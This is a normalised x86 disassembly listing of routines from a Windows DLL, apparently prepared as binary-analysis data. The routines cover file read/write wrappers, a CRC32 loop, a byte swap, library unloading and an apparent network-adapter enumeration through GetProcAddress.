mov [ esi ] r--data
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ esi + 0x10 ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1002b3f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10051158
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
call [ eax + 0x1c ]
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1002b470
push ebp
mov ebp esp
push 0xffffffff
push sub_1005119b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
push 0x1c
call sub_1003cdeb
mov ecx eax
add esp 0x4
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor ecx ecx
mov [ ecx ] r--data
mov [ ebp - 0x4 ] 0x1
mov [ ecx ] r--data
mov [ ecx + 0x10 ] 0x0
mov [ ecx + 0x4 ] 0x0
mov [ ecx + 0x8 ] 0x0
mov [ ecx + 0xc ] 0x0
mov [ ebp - 0x4 ] 0x2
xor eax eax
mov [ ecx ] r--data
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x18 ] ax
mov [ ebp - 0x4 ] al
jmp r-xdata
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0xc ]
mov eax [ ecx ]
call [ eax + 0x10 ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0xc ] ecx
mov eax [ ecx ]
call [ eax ]
test eax eax
jne r-xdata
sub_1002b540
push esi
mov esi ecx
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
pop esi
retn
mov eax [ ecx ]
call [ eax + 0x4 ]
mov ecx [ esi + 0xc ]
pop esi
mov eax [ ecx ]
jmp [ eax + 0x10 ]
sub_1002b560
push ebp
mov ebp esp
push 0xffffffff
push sub_100511db
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x28 ] eax
lea eax [ ebp + 0x8 ]
cmp ecx eax
je r-xdata
mov eax [ ebp + 0x20 ]
mov [ esi + 0x24 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
xor eax eax
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x8 ] ax
mov eax esi
mov [ ebp + 0x18 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x1c
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1002b620
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1002b650
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1002b650
push ebp
mov ebp esp
push 0xffffffff
push sub_10051213
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x20 ] 0x8
jb r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi + 0x4 ] 0x0
push eax
call [ CloseHandle@IAT ]
mov [ esi + 0x28 ] 0x0
mov [ esi + 0x20 ] 0x7
xor eax eax
mov [ esi + 0x1c ] 0x0
mov [ esi + 0xc ] ax
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0xc ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1002b700
push ebp
mov ebp esp
push 0xffffffff
push sub_10051253
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
push 0x34
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x4 ] 0x0
xor eax eax
test edi edi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
sub esp 0x18
mov ecx esp
mov [ esi + 0x4 ] eax
xor eax eax
mov [ ebp - 0x2c ] esp
push eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push r--data
mov [ ecx ] ax
call sub_10009730
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ esi + 0x4 ]
call sub_1003bc50
mov ecx [ esi + 0x4 ]
test eax eax
je r-xdata
sub esp 0x18
mov ecx esp
mov [ ebp - 0x2c ] esp
push 0xffffffff
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] 0x7
push eax
mov [ ecx ] ax
lea eax [ esi + 0xc ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
mov ecx edi
call sub_1003baa0
test ecx ecx
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
call sub_1000ba30
mov [ ebp - 0x4 ] 0x3
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x4 ] 0x0
xor eax eax
jmp r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
push 0x0
push 0x0
push 0x4
push 0x0
push 0x1
push 0xc0000000
push eax
call [ CreateFileW@IAT ]
mov [ esi + 0x28 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x14 ] 0x8
jb r-xdata
mov eax [ eax ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x14 ] 0x7
cmp [ esi + 0x28 ] 0xffffffff
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] ax
jne r-xdata
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax 0x1
mov ecx [ esi + 0x4 ]
sub_1002b880
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x0
mov edi ecx
push 0x0
push esi
push [ edi + 0x28 ]
call [ SetFilePointer@IAT ]
mov edx [ edi + 0x24 ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp esi edx
jb r-xdata
mov ecx [ ebp + 0x10 ]
lea eax [ esi + ecx ]
cmp eax edx
jbe r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn 0xc
push 0x0
lea eax [ ebp + 0x8 ]
push eax
push ecx
push [ ebp + 0xc ]
push [ edi + 0x28 ]
call [ WriteFile@IAT ]
mov eax [ ebp + 0x8 ]
mov [ edi + 0x8 ] 0x0
pop edi
pop esi
pop ebp
retn 0xc
mov ecx edx
sub ecx esi
jmp r-xdata
sub_1002b8f0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x0
mov edi ecx
push 0x0
push esi
push [ edi + 0x28 ]
call [ SetFilePointer@IAT ]
mov edx [ edi + 0x24 ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp esi edx
jb r-xdata
mov ecx [ ebp + 0x10 ]
lea eax [ esi + ecx ]
cmp eax edx
jbe r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn 0xc
push 0x0
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] 0x0
push eax
push ecx
push [ ebp + 0xc ]
push [ edi + 0x28 ]
call [ ReadFile@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn 0xc
mov ecx edx
sub ecx esi
jmp r-xdata
sub_1002b960
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1005128b
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x1014
call sub_10048ab0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1010 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1028 ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov eax [ edi + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x1028 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x1010 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn
xor esi esi
mov [ esp + 0x14 ] r--data
mov [ esp + 0x18 ] esi
mov [ esp + 0x1030 ] esi
xor ebx ebx
mov eax [ edi ]
mov [ esp + 0x10 ] ebx
call [ eax + 0xc ]
test eax eax
je r-xdata
mov [ edi + 0x8 ] esi
mov [ esp + 0x1030 ] 0xffffffff
mov eax esi
mov [ esp + 0x14 ] r--data
jmp r-xdata
mov eax [ edi ]
lea ecx [ esp + 0x1c ]
push 0x1000
push ecx
push ebx
mov ecx edi
call [ eax + 0x14 ]
mov ebx eax
test ebx ebx
je r-xdata
lea edx [ esp + 0x1c ]
mov ecx ebx
not esi
movzx eax [ edx ]
lea edx [ edx + 0x1 ]
xor eax esi
shr esi 0x8
and eax 0xff
xor esi [ eax * 4 + r--data ]
dec ecx
jne r-xdata
add [ esp + 0x10 ] ebx
not esi
mov [ esp + 0x18 ] esi
mov ecx edi
mov eax [ edi ]
call [ eax + 0xc ]
mov ebx [ esp + 0x10 ]
cmp ebx eax
jb r-xdata
sub_1002ba90
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1002bac0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
mov esi ecx
mov ecx [ ebp + 0x14 ]
test ecx ecx
jg r-xdata
push [ ebp + 0xc ]
mov eax [ esi ]
mov ecx esi
push [ ebp + 0x8 ]
call [ eax + 0x8 ]
pop esi
pop ebp
retn 0x10
jl r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn 0x10
test eax eax
jne r-xdata
test ecx ecx
jl r-xdata
push 0x0
push [ esi + 0xc ]
push ecx
push eax
call sub_1004b160
imul eax [ esi + 0x8 ]
mov ecx [ esi + 0x10 ]
add eax [ ebp + 0x8 ]
cmp eax ecx
jb r-xdata
jg r-xdata
mov ecx [ ebp + 0xc ]
cmp eax ecx
pop esi
cmovb ecx eax
mov eax ecx
pop ebp
retn 0x10
cmp ecx [ ebp + 0xc ]
pop esi
cmova ecx [ ebp + 0xc ]
mov eax ecx
pop ebp
retn 0x10
cmp eax [ esi + 0x4 ]
jb r-xdata
sub_1002bb40
push ebp
mov ebp esp
mov eax [ ecx + 0x4 ]
xor edx edx
div [ ecx + 0xc ]
mov edx eax
mov eax [ ecx + 0x10 ]
imul edx [ ecx + 0x8 ]
add edx [ ebp + 0x8 ]
cmp edx eax
jb r-xdata
mov eax [ ebp + 0xc ]
cmp edx eax
cmovb eax edx
pop ebp
retn 0x8
cmp eax [ ebp + 0xc ]
cmova eax [ ebp + 0xc ]
pop ebp
retn 0x8
sub_1002bb80
push ebp
mov ebp esp
push 0xffffffff
push sub_100512e9
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx ecx
mov [ ebp - 0x10 ] edx
mov [ edx ] r--data
mov [ ebp - 0x4 ] 0x0
mov [ edx ] r--data
mov [ edx + 0x10 ] r--data
mov [ edx + 0x18 ] 0x0
mov [ edx + 0x1c ] 0x0
mov [ ebp - 0x4 ] 0x1
mov [ edx + 0x20 ] r--data
mov [ edx + 0x28 ] 0x0
mov [ edx + 0x2c ] 0x0
mov [ ebp - 0x4 ] 0x2
mov [ edx + 0x30 ] 0x0
mov [ edx + 0x34 ] 0x0
mov [ edx + 0x38 ] 0x0
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] eax
mov [ edx + 0xc ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov eax edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_1002bc30
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1002bc60
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1002bc60
push ebp
mov ebp esp
push 0xffffffff
push sub_10051339
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x14 ] ebx
mov [ ebx ] r--data
mov [ ebp - 0x4 ] 0x3
xor edx edx
mov esi [ ebx + 0x30 ]
xor edi edi
mov ecx [ ebx + 0x34 ]
sub ecx esi
add ecx 0x3
shr ecx 0x2
cmp esi [ ebx + 0x34 ]
cmova ecx edx
mov [ ebp - 0x10 ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ecx
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
mov [ ebx + 0x20 ] r--data
mov [ ebp - 0x4 ] 0x0
mov [ ebx + 0x10 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebx ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebx + 0x30 ] 0x0
mov [ ebx + 0x34 ] 0x0
mov [ ebx + 0x38 ] 0x0
mov ecx [ esi ]
test ecx ecx
je r-xdata
inc edi
add esi 0x4
cmp edi eax
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov eax [ ebp - 0x10 ]
sub_1002bd40
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10051368
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
xorps xmm0 xmm0
mov [ esp + 0x14 ] r--data
movlpd [ esp + 0x1c ] xmm0
mov [ esp + 0x30 ] 0x0
mov edx [ ebx + 0x18 ]
mov eax edx
mov esi [ ebx + 0x1c ]
mov ecx esi
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] ecx
add eax [ ebx + 0x8 ]
mov [ esp + 0x1c ] eax
mov eax [ ebp + 0x8 ]
adc ecx 0x0
mov [ esp + 0x20 ] ecx
mov edi [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov [ esp + 0x10 ] eax
cmp ecx eax
jg r-xdata
mov ecx edx
mov eax esi
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] eax
add ecx [ ebx + 0x4 ]
mov [ esp + 0x1c ] ecx
adc eax 0x0
mov [ esp + 0x20 ] eax
cmp [ esp + 0x10 ] eax
jg r-xdata
jl r-xdata
mov [ esp + 0x1c ] edx
mov [ esp + 0x20 ] esi
add edx [ ebx + 0xc ]
mov [ esp + 0x1c ] edx
adc esi 0x0
mov [ esp + 0x20 ] esi
cmp esi [ esp + 0x10 ]
jg r-xdata
jl r-xdata
mov eax 0x1
jmp r-xdata
cmp [ esp + 0x1c ] edi
jb r-xdata
xor eax eax
jl r-xdata
cmp edi ecx
jb r-xdata
mov [ esp + 0x30 ] 0xffffffff
mov [ esp + 0x14 ] r--data
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp edx edi
jae r-xdata
sub_1002be80
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ebp + 0x8 ]
sub esp 0xc
push ebx
mov ebx [ eax + 0xc ]
push esi
mov esi ecx
push edi
mov edi [ eax + 0x8 ]
mov eax [ esi + 0x28 ]
sub edi eax
mov ecx [ esi + 0x2c ]
sbb ebx ecx
test ebx ebx
jl r-xdata
mov eax [ esi + 0x8 ]
mov [ esi + 0xc ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
jg r-xdata
mov eax [ esi + 0x34 ]
sub eax [ esi + 0x30 ]
test eax 0xfffffffc
je r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x4 ]
xor edx edx
mov [ esp + 0x10 ] eax
mov eax [ esi + 0x34 ]
sub eax [ esi + 0x30 ]
sar eax 0x2
mov [ esp + 0x14 ] edx
test eax eax
je r-xdata
mov eax [ esi + 0x30 ]
mov ecx [ eax + edx * 4 ]
mov eax [ ecx + 0x4 ]
test ebx ebx
jl r-xdata
mov eax [ esi + 0x30 ]
push ebx
push edi
push [ esi + 0x8 ]
mov ecx [ eax + edx * 4 ]
push [ esp + 0x1c ]
mov eax [ ecx ]
call [ eax + 0x4 ]
pop edi
mov [ esi + 0xc ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
jg r-xdata
push [ esi + 0x8 ]
sub edi eax
mov eax [ ecx ]
push [ esp + 0x14 ]
sbb ebx 0x0
call [ eax + 0x8 ]
mov ecx [ esi + 0x34 ]
mov edx [ esp + 0x14 ]
sub ecx [ esi + 0x30 ]
inc edx
sar ecx 0x2
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
cmp edx ecx
jb r-xdata
cmp edi eax
jb r-xdata
sub_1002bf40
push ebp
mov ebp esp
push 0xffffffff
push sub_100513a3
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov [ esi + 0x8 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1002bfb0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_100513c8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x18 ]
mov [ fs : 0x0 ] eax
mov edx [ ecx + 0x10 ]
mov [ esp + 0xc ] edx
mov eax [ ecx + 0x14 ]
mov [ esp + 0x4 ] r--data
mov [ esp + 0x10 ] eax
mov [ esp + 0x20 ] 0x0
add edx [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
adc eax 0x0
mov [ esp + 0xc ] edx
mov [ esp + 0x10 ] eax
cmp eax [ ecx + 0xc ]
jg r-xdata
xor eax eax
jl r-xdata
mov eax 0x1
jmp r-xdata
cmp edx [ ecx + 0x8 ]
jae r-xdata
mov [ esp + 0x20 ] 0xffffffff
mov [ esp + 0x4 ] r--data
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_1002c060
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov ecx edx
push ebx
push esi
xor esi esi
mov ebx edx
push edi
mov edi [ ebp + 0x8 ]
and ebx 0xff0000
mov eax edi
shrd eax ecx 0x10
or esi eax
shr ecx 0x10
or ebx ecx
mov eax edx
shrd esi ebx 0x10
and eax 0xff00
xor ecx ecx
shr ebx 0x10
or ebx eax
movzx eax dl
shrd esi ebx 0x10
shr ebx 0x10
or ebx eax
mov eax edi
shrd esi ebx 0x8
shld edx eax 0x10
mov [ ebp + 0xc ] esi
mov esi edi
and esi 0xff00
shl eax 0x10
or esi eax
shr ebx 0x8
or edx ecx
mov eax edi
shld edx esi 0x10
and eax 0xff0000
and edi 0xff000000
shl esi 0x10
or esi eax
mov eax [ ebp + 0xc ]
shld edx esi 0x10
shl esi 0x10
or esi edi
shld edx esi 0x8
pop edi
shl esi 0x8
or eax esi
or edx ebx
pop esi
pop ebx
pop ebp
retn
sub_1002c120
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call [ FreeLibrary@IAT ]
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1002c150
push ebp
mov ebp esp
push 0xffffffff
push sub_10051529
mov eax [ fs : 0x0 ]
push eax
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi edx
mov edi ecx
mov [ ebp - 0xf8 ] edi
mov [ ebp - 0xf0 ] 0x0
mov [ ebp - 0xfc ] edi
mov [ ebp - 0xec ] 0x0
mov [ ebp - 0xe8 ] 0x0
mov [ ebp - 0xe4 ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ rw-data ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx 0x7a
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov [ edi ] 0x0
mov [ edi + 0x4 ] 0x0
mov [ edi + 0x8 ] 0x0
mov [ ebp - 0xec ] 0x0
mov [ ebp - 0xe8 ] 0x0
mov [ ebp - 0xe4 ] 0x0
mov [ ebp - 0xf0 ] 0x1
mov [ ebp - 0x4 ] 0x0
push ecx
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x1000
mov [ ebp - 0xdc ] 0x1000
call sub_1003c61a
add esp 0x4
mov [ ebp - 0xcc ] eax
lea ecx [ ebp - 0xdc ]
mov ebx eax
mov [ ebp - 0xc8 ] ebx
push ecx
push eax
call esi
cmp eax 0x6f
jne r-xdata
test eax eax
jne r-xdata
push ebx
call j_sub_1003f3e3
push [ ebp - 0xdc ]
call sub_1003c61a
add esp 0x8
mov [ ebp - 0xcc ] eax
lea ecx [ ebp - 0xdc ]
mov [ ebp - 0xc8 ] eax
mov ebx eax
push ecx
push eax
call esi
push [ ebp - 0xcc ]
call j_sub_1003f3e3
add esp 0x4
mov [ edi ] 0x0
mov [ edi + 0x4 ] 0x0
mov [ edi + 0x8 ] 0x0
mov [ ebp - 0xec ] 0x0
mov [ ebp - 0xe8 ] 0x0
mov [ ebp - 0xe4 ] 0x0
mov [ ebp - 0xf0 ] 0x1
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0xec ]
call sub_10014910
jmp r-xdata
cmp [ ebp - 0xcc ] eax
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
mov [ ebp - 0x98 ] 0x0
mov [ ebp - 0x94 ] 0x0
mov [ ebp - 0x94 ] 0xf
mov [ ebp - 0x98 ] 0x0
mov [ ebp - 0xa8 ] 0x0
mov [ ebp - 0x4 ] 0x2
xor eax eax
mov [ ebp - 0x80 ] 0x0
mov [ ebp - 0x7c ] 0x0
mov [ ebp - 0x7c ] 0x7
mov [ ebp - 0x80 ] 0x0
mov [ ebp - 0x90 ] ax
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x5c ] 0xf
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x70 ] al
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x4 ] 0x7
lea edx [ ebx + 0x8 ]
cmp [ edx ] al
jne r-xdata
mov ecx edx
lea esi [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx esi
push ecx
push edx
lea ecx [ ebp - 0xa8 ]
call sub_100019e0
push [ ebx + 0x190 ]
lea eax [ ebx + 0x194 ]
mov [ ebp - 0xb0 ] 0x0
mov [ ebp - 0xac ] 0x0
lea ecx [ ebp - 0xc0 ]
push eax
mov [ ebp - 0xac ] 0xf
mov [ ebp - 0xb0 ] 0x0
mov [ ebp - 0xc0 ] 0x0
call sub_100019e0
mov [ ebp - 0x4 ] 0x8
cmp [ ebp - 0x5c ] 0x10
jb r-xdata
lea eax [ ebp - 0xc0 ]
mov [ ebp - 0x5c ] 0xf
push eax
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x70 ] 0x0
call sub_10005010
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0xac ] 0x10
jb r-xdata
push [ ebp - 0x70 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ ebx + 0x1a0 ]
mov [ ebp - 0xac ] 0xf
mov [ ebp - 0xb0 ] 0x0
mov [ ebp - 0xc0 ] 0x0
cmp eax 0x6
je r-xdata
push [ ebp - 0xc0 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax 0x1
cmp eax 0x47
je r-xdata
mov eax [ rw-data ]
add ebx 0x1ac
mov [ ebp - 0xf4 ] eax
mov [ ebp - 0xc4 ] ebx
je r-xdata
mov ecx 0x7c
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
xor eax eax
jmp r-xdata
mov ebx [ ebp - 0xc8 ]
add ebx 0x1d4
mov [ ebp - 0xc4 ] ebx
je r-xdata
nop
mov [ ebp - 0x74 ] eax
xor eax eax
cmp [ ebx + 0x1a4 ] eax
setne al
cmp [ rw-data ] 0x0
mov [ ebp - 0x78 ] eax
jne r-xdata
mov ebx [ ebp - 0xc8 ]
mov ebx [ ebx ]
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0xa8 ]
call sub_10014980
test ebx ebx
jne r-xdata
lea edx [ ebx + 0x4 ]
cmp edx eax
je r-xdata
mov ebx [ ebx ]
mov [ ebp - 0xc4 ] ebx
test ebx ebx
jne r-xdata
cmp [ edx ] 0x0
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x2c ] 0xf
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
jne r-xdata
mov edi [ ebp - 0xf8 ]
mov ebx [ ebx ]
mov [ ebp - 0xc4 ] ebx
test ebx ebx
jne r-xdata
cmp [ edx ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
jne r-xdata
lea edx [ ebx + 0x4 ]
cmp edx eax
je r-xdata
mov ecx edx
lea esi [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov eax edx
